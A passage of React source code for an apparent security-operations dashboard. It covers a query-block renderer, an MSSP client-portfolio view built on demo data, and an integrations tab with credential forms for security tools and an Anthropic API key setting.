    const isQueryLabel = /^(KQL QUERY|SPLUNK QUERY|SENTINEL|DEFENDER|MICROSOFT|SOURCE=)/i.test(trimmed);
    const isMajorHeading = /^[A-Z][A-Z\s\-:\/]+$/.test(trimmed) && trimmed.length > 8 && trimmed.length < 80 && !isCodeLine;
    const isSubHeading = /^(KQL QUERY \d+:|SPLUNK QUERY FOR |MICROSOFT |DETECTION |REMEDIATION |COMPENSATING |COMMON |HOW ATTACKERS)/i.test(trimmed);

    if (isSubHeading || isQueryLabel) {
      if (inCode && codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
      blocks.push({ type:'subheading', content:trimmed });
      inCode = true; // next lines are likely code
    } else if (isMajorHeading) {
      if (inCode && codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
      blocks.push({ type:'heading', content:trimmed });
      inCode = false;
    } else if (inCode && trimmed) {
      codeBuffer.push(line);
    } else {
      if (codeBuffer.length) { blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) }); codeBuffer = []; inCode = false; }
      blocks.push({ type:'text', content:trimmed });
    }
  }
  if (codeBuffer.length) blocks.push({ type:'code', content:codeBuffer.join('\n'), id:('code-' + (++codeId)) });

  return (
    <div style={{display:'flex',flexDirection:'column',gap:10}}>
      {blocks.map((block, i) => {
        if (block.type === 'heading') return (
          <div key={i} style={{fontSize:'0.58rem',fontWeight:800,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1.5px',paddingTop: i>0?8:0,borderTop: i>0?'1px solid var(--wt-border)':'none',marginTop: i>0?2:0}}>{block.content}</div>
        );
        if (block.type === 'subheading') return (
          <div key={i} style={{fontSize:'0.68rem',fontWeight:700,color:'var(--wt-text)',marginTop:4,marginBottom:-4}}>{block.content}</div>
        );
        if (block.type === 'code') return (
          <div key={i} style={{position:'relative',background:'#020306',border:'1px solid #1a2235',borderRadius:8,overflow:'hidden'}}>
            <div style={{display:'flex',alignItems:'center',justifyContent:'space-between',padding:'5px 10px',borderBottom:'1px solid #1a2235',background:'#060912'}}>
              <span style={{fontSize:'0.54rem',fontWeight:700,color:'#4f8fff',letterSpacing:'0.5px',textTransform:'uppercase'}}>Query</span>
              <button onClick={()=>copyCode(block.content, block.id||'')} style={{fontSize:'0.56rem',fontWeight:600,padding:'2px 8px',borderRadius:4,border:'1px solid #1e2536',background:'transparent',color:copied===block.id?'#22d49a':'var(--wt-muted)',cursor:'pointer',fontFamily:'Inter,sans-serif',transition:'color .15s'}}>
                {copied===block.id?'✓ Copied':'Copy'}
              </button>
            </div>
            <pre style={{margin:0,padding:'10px 12px',fontSize:'0.63rem',fontFamily:'JetBrains Mono,monospace',color:'#a8c0e8',lineHeight:1.7,overflowX:'auto',whiteSpace:'pre-wrap',wordBreak:'break-all'}}>{block.content.trim()}</pre>
          </div>
        );
        return (
          <div key={i} style={{fontSize:'0.72rem',color:'var(--wt-secondary)',lineHeight:1.7}}>{block.content}</div>
        );
      })}
    </div>
  );
}

// ─── MSSP Portfolio Component ────────────────────────────────────────────────

function MSSPPortfolio({ currentTenant, setCurrentTenant, DEMO_TENANTS, isAdmin, setActiveTab, setAdminBannerInput }) {
  const [portfolioView, setPortfolioView] = React.useState('security');
  const [selectedClient, setSelectedClient] = React.useState(null);

  // The MSSP's own managed clients — organisations they provide SOC services to
  // In production this would load from /api/portfolio based on the MSSP's tenant ID
  const MY_CLIENTS = [
    {id:'client-acme',  name:'Acme Financial',  sector:'Financial Services', seats:8,  mrr:199, contractStart:'2024-01-15', renewalDate:'2025-01-15', billingStatus:'Paid',    posture:82, alerts:8,  critAlerts:3, incidents:2, coverage:94, kevVulns:3,  lastSeen:'2m ago',  toolsConnected:4},
    {id:'client-nhs',   name:'NHS Trust Alpha',  sector:'Healthcare',         seats:14, mrr:199, contractStart:'2024-03-01', renewalDate:'2025-03-01', billingStatus:'Paid',    posture:71, alerts:15, critAlerts:5, incidents:3, coverage:88, kevVulns:7,  lastSeen:'1m ago',  toolsConnected:6},
    {id:'client-retail',name:'RetailCo UK',      sector:'Retail',             seats:6,  mrr:294, contractStart:'2024-06-10', renewalDate:'2025-06-10', billingStatus:'Paid',    posture:91, alerts:4,  critAlerts:1, incidents:1, coverage:97, kevVulns:4,  lastSeen:'5m ago',  toolsConnected:5},
    {id:'client-gov',   name:'Gov Dept Beta',   sector:'Government',         seats:10, mrr:199, contractStart:'2024-09-20', renewalDate:'2025-09-20', billingStatus:'Overdue', posture:78, alerts:9,  critAlerts:3, incidents:1, coverage:92, kevVulns:5,  lastSeen:'8m ago',  toolsConnected:3},
  ];

  const totalMRR = MY_CLIENTS.reduce((s,c)=>s+c.mrr, 0);
  const totalSeats = MY_CLIENTS.reduce((s,c)=>s+c.seats, 0);
  const overdueMRR = MY_CLIENTS.filter(c=>c.billingStatus==='Overdue').reduce((s,c)=>s+c.mrr, 0);

  return (
    <div style={{display:'flex',flexDirection:'column',gap:14}}>

      {/* Header */}
      <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap'}}>
        <div>
          <h2 style={{fontSize:'0.88rem',fontWeight:700,display:'flex',alignItems:'center',gap:8}}>
            My Client Portfolio
            <span style={{fontSize:'0.62rem',color:'#8b6fff',background:'#8b6fff12',padding:'2px 8px',borderRadius:4,border:'1px solid #8b6fff25',fontWeight:700}}>MSSP</span>
          </h2>
          <div style={{fontSize:'0.68rem',color:'var(--wt-muted)',marginTop:2}}>Organisations you manage security for · {MY_CLIENTS.length} active clients</div>
        </div>
        <div style={{display:'flex',gap:3,background:'var(--wt-card2)',borderRadius:7,padding:3,marginLeft:'auto'}}>
          {['security','revenue','usage'].map(v=>(
            <button key={v} onClick={()=>setPortfolioView(v)} style={{padding:'5px 14px',borderRadius:5,border:'none',background:portfolioView===v?'#8b6fff':'transparent',color:portfolioView===v?'#fff':'var(--wt-muted)',fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',textTransform:'capitalize'}}>{v}</button>
          ))}
        </div>
      </div>

      {/* Security summary */}
      {portfolioView==='security' && (
        <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}}>
          {[
            {label:'Active Incidents',  val:MY_CLIENTS.reduce((s,c)=>s+c.incidents,0),  color:'#f0405e'},
            {label:'Critical Alerts',   val:MY_CLIENTS.reduce((s,c)=>s+c.critAlerts,0), color:'#f0405e'},
            {label:'KEV Outstanding',   val:MY_CLIENTS.reduce((s,c)=>s+c.kevVulns,0),   color:'#f97316'},
            {label:'Avg Posture Score', val:`${Math.round(MY_CLIENTS.reduce((s,c)=>s+c.posture,0)/MY_CLIENTS.length)}%`, color:'#22d49a'},
          ].map(s=>(
            <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12,textAlign:'center'}}>
              <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2}}>{s.val}</div>
              <div style={{fontSize:'0.6rem',color:'var(--wt-muted)',marginTop:2}}>{s.label}</div>
            </div>
          ))}
        </div>
      )}

      {/* Revenue summary */}
      {portfolioView==='revenue' && (
        <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}}>
          {[
            {label:'Monthly Recurring Revenue', val:`£${totalMRR.toLocaleString()}`, sub:'MRR', color:'#22d49a'},
            {label:'Annual Recurring Revenue',  val:`£${(totalMRR*12/1000).toFixed(1)}k`, sub:'ARR', color:'#4f8fff'},
            {label:'Seats Under Management',    val:totalSeats, sub:'seats', color:'#8b6fff'},
            {label:'Overdue Balance',           val:overdueMRR>0?`£${overdueMRR}`:'£0', sub:overdueMRR>0?'action needed':'all clear', color:overdueMRR>0?'#f0405e':'#22d49a'},
          ].map(s=>(
            <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12}}>
              <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2,lineHeight:1}}>{s.val}</div>
              <div style={{fontSize:'0.58rem',fontWeight:700,color:s.color,textTransform:'uppercase',letterSpacing:'0.5px',marginTop:3}}>{s.sub}</div>
              <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:2}}>{s.label}</div>
            </div>
          ))}
        </div>
      )}

      {/* Usage summary */}
      {portfolioView==='usage' && (
        <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}}>
          {[
            {label:'Total Alerts This Week',  val:MY_CLIENTS.reduce((s,c)=>s+c.alerts,0),   color:'#4f8fff'},
            {label:'AI Auto-Closed',          val:Math.round(MY_CLIENTS.reduce((s,c)=>s+c.alerts,0)*0.68)+' FPs', color:'#22d49a'},
            {label:'Tools Connected (avg)',   val:Math.round(MY_CLIENTS.reduce((s,c)=>s+c.toolsConnected,0)/MY_CLIENTS.length), color:'#8b6fff'},
            {label:'Critical Incidents Open', val:MY_CLIENTS.reduce((s,c)=>s+c.incidents,0), color:'#f0405e'},
            {label:'Avg Coverage',            val:Math.round(MY_CLIENTS.reduce((s,c)=>s+c.coverage,0)/MY_CLIENTS.length)+'%', color:'#22d49a'},
            {label:'Seats Managed',           val:totalSeats, color:'#4f8fff'},
          ].map(s=>(
            <div key={s.label} style={{padding:'14px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:10}}>
              <div style={{fontSize:'1.4rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-1}}>{s.val}</div>
              <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:3}}>{s.label}</div>
            </div>
          ))}
        </div>
      )}

      {/* Per-client rows */}
      {MY_CLIENTS.map(client=>{
        const isSel = selectedClient===client.id;
        const postureColor = client.posture>=85?'#22d49a':client.posture>=70?'#f0a030':'#f0405e';
        const daysToRenewal = Math.round((new Date(client.renewalDate).getTime()-Date.now())/(86400000));
        const renewalColor = daysToRenewal<30?'#f0405e':daysToRenewal<90?'#f0a030':'#22d49a';

        return (
          <div key={client.id} style={{background:currentTenant===client.id?'#080d18':'var(--wt-card)',border:`1px solid ${currentTenant===client.id?'#8b6fff40':client.billingStatus==='Overdue'?'#f0405e20':'var(--wt-border)'}`,borderRadius:12,overflow:'hidden'}}>

            {/* Client header row */}
            <div style={{padding:'12px 16px',display:'flex',alignItems:'center',gap:12,cursor:'pointer'}} onClick={()=>setSelectedClient(isSel?null:client.id)}>
              <div style={{width:9,height:9,borderRadius:'50%',background:'#22c992',boxShadow:'0 0 6px #22c992',flexShrink:0}} />
              <div style={{flex:1}}>
                <div style={{display:'flex',alignItems:'center',gap:7,flexWrap:'wrap'}}>
                  <span style={{fontSize:'0.86rem',fontWeight:700}}>{client.name}</span>
                  <span style={{fontSize:'0.56rem',color:'var(--wt-dim)'}}>{client.sector}</span>
                  {client.billingStatus==='Overdue' && <span style={{fontSize:'0.54rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#f0405e12',color:'#f0405e',border:'1px solid #f0405e20'}}>⚠ OVERDUE</span>}
                  {currentTenant===client.id && <span style={{fontSize:'0.52rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#8b6fff15',color:'#8b6fff',border:'1px solid #8b6fff25'}}>VIEWING</span>}
                </div>
                <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:1}}>Last active {client.lastSeen} · {client.seats} seats · {client.toolsConnected} tools</div>
              </div>
              {/* Quick stats */}
              {portfolioView==='security' && (
                <div style={{display:'flex',alignItems:'center',gap:12,flexWrap:'wrap'}}>
                  <div style={{display:'flex',alignItems:'center',gap:5}}>
                    <div style={{width:28,height:28,borderRadius:'50%',background:`conic-gradient(${postureColor} ${client.posture}%,var(--wt-border) 0)`,display:'flex',alignItems:'center',justifyContent:'center'}}>
                      <div style={{width:20,height:20,borderRadius:'50%',background:'var(--wt-card)',display:'flex',alignItems:'center',justifyContent:'center',fontSize:'0.46rem',fontWeight:900,color:postureColor}}>{client.posture}</div>
                    </div>
                  </div>
                  {[{label:'Alerts',val:client.alerts,c:client.critAlerts>0?'#f0a030':'var(--wt-secondary)'},{label:'Critical',val:client.critAlerts,c:client.critAlerts>0?'#f0405e':'var(--wt-secondary)'},{label:'Incidents',val:client.incidents,c:client.incidents>0?'#f0405e':'var(--wt-secondary)'},{label:'Coverage',val:client.coverage+'%',c:client.coverage>=95?'#22d49a':client.coverage>=85?'#f0a030':'#f0405e'}].map(s=>(
                    <div key={s.label} style={{textAlign:'center',minWidth:46}}>
                      <div style={{fontSize:'1rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.c,letterSpacing:-1}}>{s.val}</div>
                      <div style={{fontSize:'0.5rem',color:'var(--wt-dim)'}}>{s.label}</div>
                    </div>
                  ))}
                </div>
              )}
              {portfolioView==='revenue' && (
                <div style={{display:'flex',gap:14}}>
                  {[{label:'MRR',val:`£${client.mrr}`,c:'#22d49a'},{label:'Renewal',val:`${daysToRenewal}d`,c:renewalColor},{label:'Billing',val:client.billingStatus,c:client.billingStatus==='Paid'?'#22d49a':'#f0405e'}].map(s=>(
                    <div key={s.label} style={{textAlign:'center',minWidth:52}}>
                      <div style={{fontSize:'0.9rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:s.c,letterSpacing:-0.5}}>{s.val}</div>
                      <div style={{fontSize:'0.5rem',color:'var(--wt-dim)'}}>{s.label}</div>
                    </div>
                  ))}
                </div>
              )}
              {portfolioView==='usage' && (
                <div style={{display:'flex',gap:14}}>
                  {[{label:'Alerts',val:client.alerts,c:'#4f8fff'},{label:'AI Closed',val:Math.round(client.alerts*0.68),c:'#22d49a'},{label:'Tools',val:client.toolsConnected,c:'#8b6fff'}].map(s=>(
                    <div key={s.label} style={{textAlign:'center',minWidth:46}}>
                      <div style={{fontSize:'0.9rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:s.c}}>{s.val}</div>
                      <div style={{fontSize:'0.5rem',color:'var(--wt-dim)'}}>{s.label}</div>
                    </div>
                  ))}
                </div>
              )}
              {/* Action buttons */}
              <div style={{display:'flex',gap:5,flexShrink:0,marginLeft:8}}>
                <button onClick={e=>{e.stopPropagation();setCurrentTenant(client.id);if(setActiveTab)setActiveTab('overview');}} style={{padding:'5px 12px',borderRadius:7,border:'1px solid #8b6fff30',background:currentTenant===client.id?'#8b6fff20':'#8b6fff10',color:'#8b6fff',fontSize:'0.66rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
                  {currentTenant===client.id?'● Viewing':'View →'}
                </button>
                <button onClick={e=>{e.stopPropagation();if(setAdminBannerInput)setAdminBannerInput('['+client.name+'] ');}} style={{padding:'5px 9px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.66rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}} title='Send message to this client'>📢</button>
              </div>
              <span style={{fontSize:'0.7rem',color:'var(--wt-dim)',flexShrink:0}}>{isSel?'▲':'▼'}</span>
            </div>

            {/* Expanded detail */}
            {isSel && (
              <div style={{borderTop:'1px solid var(--wt-border)',padding:'14px 16px',background:'var(--wt-card2)'}}>
                <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8,marginBottom:14}}>
                  {[
                    {label:'Contract Start',val:client.contractStart,c:'var(--wt-secondary)'},
                    {label:'Next Renewal',  val:client.renewalDate,  c:renewalColor},
                    {label:'Monthly Value', val:`£${client.mrr}`,   c:'#22d49a'},
                    {label:'KEV Vulns',     val:client.kevVulns,    c:'#f97316'},
                  ].map(s=>(
                    <div key={s.label} style={{textAlign:'center',padding:'10px',background:'var(--wt-card)',borderRadius:8}}>
                      <div style={{fontSize:'0.9rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:s.c}}>{s.val}</div>
                      <div style={{fontSize:'0.56rem',color:'var(--wt-dim)',marginTop:3}}>{s.label}</div>
                    </div>
                  ))}
                </div>
                <div style={{display:'flex',gap:8,flexWrap:'wrap'}}>
                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('overview');}} style={{padding:'7px 16px',borderRadius:7,border:'1px solid #8b6fff30',background:'#8b6fff10',color:'#8b6fff',fontSize:'0.72rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>View Full Dashboard →</button>
                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('alerts');}} style={{padding:'7px 14px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.72rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Alerts</button>
                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('incidents');}} style={{padding:'7px 14px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.72rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Incidents</button>
                  <button onClick={()=>{setCurrentTenant(client.id);if(setActiveTab)setActiveTab('vulns');}} style={{padding:'7px 14px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.72rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Vulns</button>
                  {client.billingStatus==='Overdue' && <button style={{marginLeft:'auto',padding:'7px 14px',borderRadius:7,border:'1px solid #f97316',background:'#f9731610',color:'#f97316',fontSize:'0.72rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Chase Payment</button>}
                </div>
              </div>
            )}
          </div>
        );
      })}

      {/* MSSP billing footer */}
      <div style={{padding:'12px 16px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,display:'flex',justifyContent:'space-between',alignItems:'center',flexWrap:'wrap',gap:12}}>
        <div style={{fontSize:'0.68rem',color:'var(--wt-muted)'}}>Your Watchtower MSSP subscription: <strong style={{color:'#8b6fff'}}>£{799 + Math.max(0,(MY_CLIENTS.length-5)*79)}/mo</strong> · {MY_CLIENTS.length} clients ({MY_CLIENTS.length<=5?'included':MY_CLIENTS.length-5+' extra × £79'})</div>
        <div style={{fontSize:'0.68rem',color:'var(--wt-muted)'}}>Your MRR from clients: <strong style={{color:'#22d49a'}}>£{totalMRR}/mo</strong> · Margin: <strong style={{color:'#22d49a'}}>£{totalMRR-(799+Math.max(0,(MY_CLIENTS.length-5)*79))}/mo</strong></div>
      </div>

    </div>
  );
}


// ─── Tools Tab ───────────────────────────────────────────────────────────────
const ALL_TOOLS = [
  {id:'crowdstrike',name:'CrowdStrike Falcon',category:'EDR',desc:'Endpoint detection & response'},
  {id:'defender',name:'Microsoft Defender',category:'EDR',desc:'Defender for Endpoint — Azure AD app required'},
  {id:'sentinelone',name:'SentinelOne',category:'EDR',desc:'AI-powered endpoint protection'},
  {id:'carbonblack',name:'Carbon Black',category:'EDR',desc:'Carbon Black Cloud'},
  {id:'splunk',name:'Splunk SIEM',category:'SIEM',desc:'Splunk Enterprise Security or Cloud'},
  {id:'sentinel',name:'Microsoft Sentinel',category:'SIEM',desc:'Cloud-native SIEM — Azure AD app required'},
  {id:'qradar',name:'IBM QRadar',category:'SIEM',desc:'Security intelligence platform'},
  {id:'elastic',name:'Elastic Security',category:'SIEM',desc:'SIEM built on Elastic Stack'},
  {id:'darktrace',name:'Darktrace',category:'NDR',desc:'AI network anomaly detection — HMAC auth'},
  {id:'taegis',name:'Secureworks Taegis',category:'XDR',desc:'Extended detection & response'},
  {id:'tenable',name:'Tenable.io',category:'Vuln',desc:'Cloud vulnerability management'},
  {id:'nessus',name:'Nessus',category:'Vuln',desc:'On-premise vulnerability scanner'},
  {id:'qualys',name:'Qualys',category:'Vuln',desc:'Cloud-based vulnerability management'},
  {id:'wiz',name:'Wiz',category:'CSPM',desc:'Cloud security posture management'},
  {id:'proofpoint',name:'Proofpoint',category:'Email',desc:'Email security & threat protection'},
  {id:'mimecast',name:'Mimecast',category:'Email',desc:'Email security platform'},
  {id:'zscaler',name:'Zscaler',category:'Network',desc:'Zero trust network access'},
  {id:'okta',name:'Okta',category:'Identity',desc:'Identity & access management'},
];

const CRED_FIELDS = {
  crowdstrike:[{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'base_url',label:'Base URL (optional)',placeholder:'https://api.crowdstrike.com'}],
  defender:[{key:'tenant_id',label:'Tenant ID',placeholder:'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'},{key:'client_id',label:'Application (Client) ID'},{key:'client_secret',label:'Client Secret',secret:true}],
  sentinelone:[{key:'host',label:'Management URL',placeholder:'https://your-tenant.sentinelone.net'},{key:'api_token',label:'API Token',secret:true}],
  carbonblack:[{key:'host',label:'CB Cloud URL',placeholder:'https://defense.conferdeploy.net'},{key:'org_key',label:'Org Key'},{key:'api_id',label:'API ID'},{key:'api_secret',label:'API Secret Key',secret:true}],
  splunk:[{key:'host',label:'Splunk Host',placeholder:'https://splunk.company.com:8089'},{key:'token',label:'API Token',secret:true}],
  sentinel:[{key:'tenant_id',label:'Tenant ID'},{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'subscription_id',label:'Subscription ID'},{key:'resource_group',label:'Resource Group'},{key:'workspace',label:'Workspace Name'}],
  qradar:[{key:'host',label:'QRadar Host',placeholder:'https://qradar.company.com'},{key:'sec_token',label:'SEC Token',secret:true}],
  elastic:[{key:'host',label:'Kibana URL',placeholder:'https://kibana.company.com'},{key:'api_key',label:'API Key',secret:true},{key:'space',label:'Space ID (optional)',placeholder:'default'}],
  darktrace:[{key:'host',label:'Darktrace Hostname',placeholder:'https://darktrace.company.com'},{key:'public_key',label:'Public Token'},{key:'private_key',label:'Private Token',secret:true}],
  taegis:[{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'region',label:'Region',placeholder:'us1'}],
  tenable:[{key:'access_key',label:'Access Key'},{key:'secret_key',label:'Secret Key',secret:true}],
  nessus:[{key:'host',label:'Nessus Host',placeholder:'https://nessus.company.com:8834'},{key:'access_key',label:'Access Key'},{key:'secret_key',label:'Secret Key',secret:true}],
  qualys:[{key:'platform',label:'Platform URL',placeholder:'https://qualysapi.qualys.com'},{key:'username',label:'Username'},{key:'password',label:'Password',secret:true}],
  wiz:[{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true},{key:'api_endpoint',label:'API Endpoint',placeholder:'https://api.eu1.app.wiz.io/graphql'}],
  proofpoint:[{key:'principal',label:'Service Principal'},{key:'secret',label:'Secret',secret:true}],
  mimecast:[{key:'base_url',label:'Base URL',placeholder:'https://eu-api.mimecast.com'},{key:'client_id',label:'Client ID'},{key:'client_secret',label:'Client Secret',secret:true}],
  zscaler:[{key:'cloud',label:'Cloud URL',placeholder:'https://zsapi.zscaler.net'},{key:'username',label:'Username'},{key:'password',label:'Password',secret:true},{key:'api_key',label:'API Key',secret:true}],
  okta:[{key:'domain',label:'Okta Domain',placeholder:'https://company.okta.com'},{key:'api_token',label:'API Token',secret:true}],
};

const CATEGORIES = ['All','EDR','SIEM','NDR','XDR','Vuln','CSPM','Email','Network','Identity'];

function ToolsTab({ connected, setConnected }) {
  const [filter, setFilter] = useState('All');
  const [modal, setModal] = useState(null);
  const [formVals, setFormVals] = useState({});
  const [testing, setTesting] = useState(false);
  const [testResult, setTestResult] = useState(null);
  const [anthropicKey, setAnthropicKey] = useState('');
  const [keyStatus, setKeyStatus] = useState('idle');
  const [aiTestStatus, setAiTestStatus] = useState(null);
  const [aiTestLoading, setAiTestLoading] = useState(false);

  useEffect(()=>{ testAiKey(); },[]);

  async function saveAnthropicKey() {
    if (!anthropicKey.trim()) return;
    setKeyStatus('saving');
    try {
      const res = await fetch('/api/settings/anthropic-key', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body:JSON.stringify({key: anthropicKey.trim(), tenantId: aiTestStatus?.tenantId || 'global'}),
      });
      const data = await res.json();
      if (res.ok && data.ok) {
        setKeyStatus('saved');
        setAnthropicKey('');
        await testAiKey();
      } else {
        setAiTestStatus({ok:false, configured:false, message: data.message || 'Failed to save key.'});
        setKeyStatus('error');
        setTimeout(()=>setKeyStatus('idle'), 4000);
      }
    } catch(e) { setKeyStatus('error'); setTimeout(()=>setKeyStatus('idle'), 3000); }
  }

  async function testAiKey() {
    setAiTestLoading(true);
    setAiTestStatus(null);
    try {
      const res = await fetch('/api/settings/test-ai');
      const data = await res.json();
      setAiTestStatus(data);
    } catch(e) {
      setAiTestStatus({ok:false, configured:false, message:'Could not reach test endpoint'});
    }
    setAiTestLoading(false);
  }

  async function handleRemoveKey() {
    await fetch('/api/settings/anthropic-key', {method:'DELETE', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tenantId: aiTestStatus ? aiTestStatus.tenantId : 'global'})});
    await testAiKey();
  }

  const filtered = filter==='All' ? ALL_TOOLS : ALL_TOOLS.filter(t=>t.category===filter);

  function openModal(tool) {
    setModal(tool);
    setFormVals({});
    setTestResult(null);
  }

  async function handleTest() {
    if (!modal) return;
    setTesting(true);
    setTestResult(null);
    try {
      const res = await fetch('/api/integrations/test', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({id:modal.id, credentials:formVals}),
      });
      const data = await res.json();
      setTestResult(data);
    } catch(e) {
      setTestResult({ok:false, message:'Test request failed'});
    }
    setTesting(false);
  }

  function handleSave() {
    if (!modal || !testResult?.ok) return;
    const newCreds = {...formVals};
    setConnected(prev=>({...prev,[modal.id]:newCreds}));
    // Persist to Redis
    fetch('/api/integrations/credentials', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({toolId:modal.id, credentials:newCreds})}).catch(()=>{});
    setModal(null);
  }

  function handleDisconnect(id) {
    setConnected(prev=>{ const n={...prev}; delete n[id]; return n; });
    // Remove from Redis
    fetch('/api/integrations/credentials', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({toolId:id, credentials:null})}).catch(()=>{});
  }

  return (
    <div style={{display:'flex',flexDirection:'column',gap:14}}>
      <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap'}}>
        <h2 style={{fontSize:'0.88rem',fontWeight:700}}>Integrations</h2>
        <span style={{fontSize:'0.62rem',color:'#22d49a',background:'#22d49a12',padding:'2px 8px',borderRadius:4}}>{Object.keys(connected).length} connected</span>
        <div style={{display:'flex',gap:4,marginLeft:'auto',flexWrap:'wrap'}}>
          {CATEGORIES.map(c=>(
            <button key={c} onClick={()=>setFilter(c)} style={{padding:'3px 10px',borderRadius:5,border:`1px solid ${filter===c?'#4f8fff40':'var(--wt-border2)'}`,background:filter===c?'#4f8fff18':'transparent',color:filter===c?'#4f8fff':'#6b7a94',fontSize:'0.62rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>{c}</button>
          ))}
        </div>
      </div>

      {/* Anthropic API Key */}
      <div style={{padding:'16px',background:'linear-gradient(135deg,rgba(79,143,255,0.05),rgba(139,111,255,0.05))',border:'1px solid #4f8fff25',borderRadius:12}}>
        <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:10}}>
          <div style={{width:8,height:8,borderRadius:'50%',background: aiTestStatus?.ok ? '#22c992' : '#f0a030',boxShadow: aiTestStatus?.ok ? '0 0 6px #22c992' : 'none',flexShrink:0}} />
          <span style={{fontSize:'0.82rem',fontWeight:700}}>AI Engine — Anthropic API Key</span>
          <span style={{fontSize:'0.58rem',fontWeight:700,padding:'2px 8px',borderRadius:4,background: aiTestStatus?.ok ? '#22d49a12' : '#f0a03012',color: aiTestStatus?.ok ? '#22d49a' : '#f0a030',border:`1px solid ${aiTestStatus?.ok ? '#22d49a20' : '#f0a03020'}`}}>
            {aiTestLoading ? 'Checking…' : aiTestStatus?.ok ? '✓ Active' : aiTestStatus?.configured ? '⚠ Key invalid' : '○ Not configured'}
          </span>
          <button onClick={testAiKey} disabled={aiTestLoading} style={{marginLeft:'auto',padding:'3px 10px',borderRadius:5,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.62rem',fontWeight:600,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>
            {aiTestLoading ? '…' : 'Test Key'}
          </button>
        </div>
        {aiTestStatus && (
          <div style={{padding:'8px 10px',borderRadius:7,background: aiTestStatus.ok ? '#22d49a08' : '#f0405e08',border:`1px solid ${aiTestStatus.ok ? '#22d49a20' : '#f0405e20'}`,fontSize:'0.7rem',color: aiTestStatus.ok ? '#22d49a' : '#f0a030',marginBottom:10,lineHeight:1.6}}>
            {aiTestStatus.message}
          </div>
        )}
        {!aiTestStatus?.ok && (
          <>
            <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:10,lineHeight:1.7}}>
              Add your Anthropic API key in <strong style={{color:'var(--wt-text)'}}>Vercel → Project Settings → Environment Variables</strong> as <code style={{background:'var(--wt-border)',padding:'1px 5px',borderRadius:3,fontFamily:'JetBrains Mono,monospace',fontSize:'0.68rem'}}>ANTHROPIC_API_KEY</code>, then redeploy. Or paste below to auto-save via API.
            </div>
            <div style={{display:'flex',gap:8,alignItems:'center'}}>
              <input type='password' value={anthropicKey} onChange={e=>setAnthropicKey(e.target.value)} placeholder='sk-ant-api03-...' style={{flex:1,padding:'8px 12px',borderRadius:7,border:'1px solid var(--wt-border2)',background:'var(--wt-bg)',color:'var(--wt-text)',fontSize:'0.76rem',fontFamily:'JetBrains Mono,monospace',outline:'none'}} />
